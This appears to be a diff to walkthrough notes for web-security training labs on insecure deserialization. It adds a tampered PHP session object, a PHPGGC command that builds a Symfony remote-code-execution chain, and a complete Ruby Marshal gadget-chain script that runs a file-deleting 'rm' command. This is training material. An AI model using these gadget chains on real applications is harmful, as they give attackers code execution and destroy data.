@@ -18,7 +18,9 @@ Lab: Modifying serialized data types
         Update the data type label for the access token by replacing s with i.
 
     The result should look like this:
+```css
     O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+```
     Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
     Send the request. Notice that the response now contains a link to the admin panel at /admin, indicating that you have successfully accessed the page as the administrator user.
     Change the path of your request to /admin and resend it. Notice that the /admin page contains links to delete specific user accounts.
@@ -82,7 +84,10 @@ Lab: Exploiting PHP deserialization with a pre-built gadget chain
     Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you'll need it to sign your exploit later.
 
     Download the "PHPGGC" tool and execute the following command:
-    ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
+
+```bash
+./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'
+```
 
     This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's morale.txt file.
     You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
@@ -111,6 +116,50 @@ Lab: Exploiting Ruby deserialization using a documented gadget chain
     Run the script and copy the resulting Base64-encoded object.
     In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
     Send the request to solve the lab.
+
+rubyexploit.rb:
+
+```ruby
+require 'base64'
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts Base64.encode64(payload)
+```
 
 ruby rubyexploit.rb | tr -d '\n'
 
